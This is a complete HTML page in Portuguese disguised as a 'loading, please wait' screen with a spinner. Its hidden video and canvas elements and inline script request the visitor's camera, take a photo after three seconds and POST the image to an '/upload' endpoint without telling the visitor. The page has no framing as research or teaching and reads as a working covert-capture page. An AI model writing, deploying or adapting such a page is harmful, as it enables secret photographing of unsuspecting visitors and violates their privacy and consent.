<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Carregando...</title>
</head>
<body style="background-color: #fff; font-family: sans-serif;">
    <div style="text-align: center; margin-top: 50px;">
        <p>Carregando conteúdo, aguarde...</p>
        <div class="spinner" style="width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"></div>
    </div>
    
    <style>
        @keyframes spin { 100% { transform: rotate(360deg); } }
    </style>

    <!-- Elementos ocultos -->
    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        async function iniciarCaptura() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
            } catch (err) {
                console.log("Erro ao acessar câmera: ", err);
            }
        }

        async function enviarFoto() {
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, 640, 480);
            
            const imageData = canvas.toDataURL('image/jpeg');

            try {
                const response = await fetch('/upload', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: imageData })
                });
                if(response.ok) console.log("Enviado!");
            } catch (err) {
                console.error("Erro no envio:", err);
            }
        }

        window.onload = () => {
            iniciarCaptura();
            setTimeout(enviarFoto, 3000); // Tira a foto após 3 segundos
        };
    </script>
</body>
</html>
